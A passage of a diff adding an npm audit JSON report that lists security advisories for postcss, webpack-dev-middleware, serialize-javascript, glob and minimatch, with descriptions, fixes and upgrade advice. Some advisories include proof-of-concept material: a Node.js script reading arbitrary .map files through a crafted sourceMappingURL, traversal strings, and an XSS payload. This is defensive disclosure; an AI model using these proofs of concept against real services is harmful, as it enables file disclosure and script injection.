undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1139510": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849\n- https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c\n- https://github.com/postcss/postcss/releases/tag/8.5.18\n- https://github.com/advisories/GHSA-r28c-9q8g-f849",
+      "created": "2026-07-24T16:24:55.000Z",
+      "id": 1139510,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "reported_by": null,
+      "title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73646"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.17",
+      "github_advisory_id": "GHSA-r28c-9q8g-f849",
+      "recommendation": "Upgrade to version 8.5.18 or later",
+      "patched_versions": ">=8.5.18",
+      "updated": "2026-08-13T17:55:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+    },
+    "1240027": {
+      "findings": [
+        {
+          "version": "5.3.4",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server>webpack-dev-middleware"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-middleware/security/advisories/GHSA-g84c-rxfj-3j2c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-76844\n- https://github.com/webpack/webpack-dev-middleware/pull/2404\n- https://github.com/webpack/webpack-dev-middleware/commit/13344e78b26d88fe9b7c8381a3860e248a52359b\n- https://github.com/webpack/webpack-dev-middleware/commit/cefccbac330c29052fc6dffe85fd292ea2ac782b\n- https://github.com/advisories/GHSA-wr3j-pwj9-hqq6\n- https://github.com/webpack/webpack-dev-middleware/blob/v8.1.1/src/middleware.js\n- https://github.com/webpack/webpack-dev-middleware/releases/tag/v7.4.6\n- https://github.com/webpack/webpack-dev-middleware/releases/tag/v8.3.0\n- https://www.vulncheck.com/advisories/webpack-dev-middleware-path-traversal-via-offset-slice-on-a-non-slash-terminated-publicpath\n- https://github.com/advisories/GHSA-g84c-rxfj-3j2c",
+      "created": "2026-09-29T16:59:18.000Z",
+      "id": 1240027,
+      "npm_advisory_id": null,
+      "overview": "> [!IMPORTANT]\n> CVE-2026-76844 was assigned and published for this issue by VulnCheck on 2026-08-24 without prior coordination with the webpack maintainers or the OpenJS Foundation, which holds the CVE Numbering Authority scope for webpack projects. Neither the maintainers nor the OpenJS CNA were notified before publication, and no fix was available at that time. This advisory is the coordinated record produced by the webpack maintainers and the OpenJS Foundation CNA.\n\n### Impact\n\n`webpack-dev-middleware` resolves a request to a local file in `getFilenameFromUrl`. When the configured `publicPath` has no trailing slash (for example `/assets`), a request that shares that prefix without being under it (for example `/assets../secret`) still passes the containment check, and the `..` guard does not catch it because it runs on the path before the `publicPath` prefix is stripped. The stripped remainder then escapes the configured output directory once joined, so an unauthenticated request can read files outside the output root. Applications serving `webpack-dev-middleware` (directly or via `webpack-dev-server`) with a `publicPath` that does not end in a slash are affected. A development server reachable on the network can be attacked with a single request and no victim interaction.\n\n### Patches\n\nPatched in `webpack-dev-middleware` 8.3.0. There is no backport to the 5.x, 6.x, or 7.x lines; users on those lines should upgrade to 8.3.0 or later.\n\n### Workarounds\n\nConfigure `publicPath` with a trailing slash (for example `/assets/` instead of `/assets`), or upgrade to a patched version.\n\n### References\n\n- [CVE-2024-29180](https://www.cve.org/CVERecord?id=CVE-2024-29180) ([GHSA-wr3j-pwj9-hqq6](https://github.com/webpack/webpack-dev-middleware/security/advisories/GHSA-wr3j-pwj9-hqq6)), the earlier path traversal in the same component that this issue bypasses.",
+      "reported_by": null,
+      "title": "webpack-dev-middleware vulnerable to Path Traversal via non-slash-terminated publicPath",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-76844"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "webpack-dev-middleware",
+      "vulnerable_versions": "<7.4.5",
+      "github_advisory_id": "GHSA-g84c-rxfj-3j2c",
+      "recommendation": "Upgrade to version 7.4.6 or later",
+      "patched_versions": ">=7.4.6",
+      "updated": "2026-09-29T16:59:19.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-g84c-rxfj-3j2c"
+    },
+    "1243082": {
+      "findings": [
+        {
+          "version": "6.0.2",
+          "paths": [
+            ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-m5mm-p8h7-m29v\n- https://github.com/yahoo/serialize-javascript/pull/235\n- https://github.com/yahoo/serialize-javascript/commit/2864b3c6260a3bfd52d2db3e70d1a079de108a61\n- https://github.com/yahoo/serialize-javascript/releases/tag/v7.1.3\n- https://github.com/advisories/GHSA-m5mm-p8h7-m29v",
+      "created": "2026-10-23T22:09:52.000Z",
+      "id": 1243082,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`serialize-javascript` escapes its output so it is safe to embed inside a\n`<script>` element. Before 7.1.3 that guarantee did not hold for a **function\nvalue whose source ends in a bare `</script`**.\n\nEach function body is escaped on its own, and a bare `</script` was only\nneutralized when followed — within the same body — by a character the HTML\ntokenizer treats as ending the tag name (TAB, LF, FF, CR, SPACE, `/` or `>`).\nA body ending exactly at `</script` has no following character, so it was\nemitted unescaped. The delimiter is then supplied by the surrounding output\n(for example the newline the `space` option emits after the value), and a\nlater serialized value can supply the closing `>` followed by markup:\n\n```js\nconst serialize = require('serialize-javascript');\nfunction f() {} f.toString = () => 'function f(){ return 1 }//</script';\nfunction g() {} g.toString = () => 'function g(x){ return x } > <img src=x onerror=alert(1)>';\nserialize({ a: { f }, g }, { space: 2 });\n// {\n//   \"a\": {\n//     \"f\": function f(){ return 1 }//</script\n//   },\n//   \"g\": function g(x){ return x } > <img src=x onerror=alert(1)>\n// }\n```\n\nEmbedded in a `<script>` element, the script ends at the injected tag and the\n`<img>` becomes a live element in the page.\n\nExploitation requires an attacker to control the **source text** of a\nserialized function, in practice through a spoofed `toString()`. Real\nfunctions always end in `}`, so ordinary function values are not affected,\nand non-function values (including strings containing `</script`) are\nescaped correctly.\n\n### Patches\n\nFixed in **7.1.3** (#235). The bare `</script` form is now also matched at\nthe end of the function body, so it is escaped regardless of what follows it\nin the output.\n\n### Workarounds\n\nUpgrade to **7.1.3**. If you cannot upgrade, do not serialize function values\nwhose source text (or `toString()`) can be influenced by an attacker.\n\n### Credits\n\nReported by **ha_kr25** via the Yahoo bug bounty program.",
+      "reported_by": null,
+      "title": "Serialize JavaScript: Cross-site scripting (XSS) via unescaped </script at the end of a serialized function body",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-115897"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "serialize-javascript",
+      "vulnerable_versions": "<7.1.3",
+      "github_advisory_id": "GHSA-m5mm-p8h7-m29v",
+      "recommendation": "Upgrade to version 7.1.3 or later",
+      "patched_versions": ">=7.1.3",
+      "updated": "2026-10-23T22:09:53.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m5mm-p8h7-m29v"
+    },
+    "1244013": {
+      "findings": [
+        {
+          "version": "10.5.0",
+          "paths": [
+            ".>@form-create/designer>js-beautify>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-3g3m-2fjr-6pw4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118773\n- https://github.com/isaacs/node-glob/commit/4682e8c9babee1b385202ede36389634e12076d7\n- https://github.com/isaacs/node-glob/releases/tag/v14.0.2\n- https://github.com/advisories/GHSA-3g3m-2fjr-6pw4",
+      "created": "2026-10-30T23:09:11.000Z",
+      "id": 1244013,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nIn glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.\n\nThe root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.\n\n### Details\n\nThis was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).\n\nThe README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:\n\n- GlobUtil.walkCB()\n- GlobUtil.walkCB2()\n- GlobUtil.walkCBSync()\n- GlobUtil.walkCB2Sync()\n\nExample vulnerable pattern:\n\nif (this.signal?.aborted) cb()\n\nBecause execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.\n\nThe issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.\n\nThe issue affects both glob() and globStream().\n\nRecommended fix:\nChange each abort branch to return immediately:\n\nif (this.signal?.aborted) return cb()\n\n### Proof of concept\n\nEnvironment:\n- Linux x86_64\n- Node.js v22.23.3\n- npm 10.9.9\n- glob 13.0.6\n\nReproduction steps:\n\n1. Install the affected package:\n   npm init -y\n   npm install glob@13.0.6\n\n2. Run the attached PoC:\n   node poc/abort-continues-work.mjs\n\nThe PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.\n\nObserved output on the vulnerable version:\n\n{\n  \"rejection\": \"Error: probe-abort\",\n  \"readdirCalls\": 1365,\n  \"readdirCallsAtReject\": 5,\n  \"readdirCallsAfterReject\": 1360\n}\n\nExpected behavior:\nreaddirCallsAfterReject should be 0.\n\nA second PoC using AbortSignal.timeout() also reproduces the issue:\n\n{\n  \"rejection\": \"TimeoutError: The operation was aborted due to timeout\",\n  \"readdirCalls\": 133,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 132\n}\n\nThe same test against a patched build with return cb() in the four abort branches stops immediately:\n\n{\n  \"readdirCalls\": 1,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 0\n}\n\n### Impact\n\nThis is an availability issue.\n\nApplications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.\n\nRepeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.\n\nNo confidentiality or integrity impact was observed.",
+      "reported_by": null,
+      "title": "Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118773"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "glob",
+      "vulnerable_versions": ">=9.0.0 <=14.0.1",
+      "github_advisory_id": "GHSA-3g3m-2fjr-6pw4",
+      "recommendation": "Upgrade to version 14.0.2 or later",
+      "patched_versions": ">=14.0.2",
+      "updated": "2026-10-30T23:09:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3g3m-2fjr-6pw4"
+    },
+    "1244623": {
+      "findings": [
+        {
+          "version": "9.0.9",
+          "paths": [
+            ".>@form-create/designer>js-beautify>editorconfig>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/isaacs/minimatch/commit/297b6c1a01f2410b3ba1ebed14ba222d0c3c1033\n- https://github.com/isaacs/minimatch/commit/fd0b3ab9cbc5bf1aff1c99f1f46e413c2b3340da\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+      "created": "2026-10-30T23:09:55.000Z",
+      "id": 1244623,
+      "npm_advisory_id": null,
+      "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+      "reported_by": null,
+      "title": "minimatch has potential denial of service via globparts amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118764"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=7.0.0 <11.0.1",
+      "github_advisory_id": "GHSA-g3hv-75wg-m249",
+      "recommendation": "Upgrade to version 11.0.1 or later",
+      "patched_versions": ">=11.0.1",
+      "updated": "2026-11-04T16:50:04.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 15,
+      "high": 6,
+      "critical": 0
+    },
+    "dependencies": 1143,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1143
+  }
+}
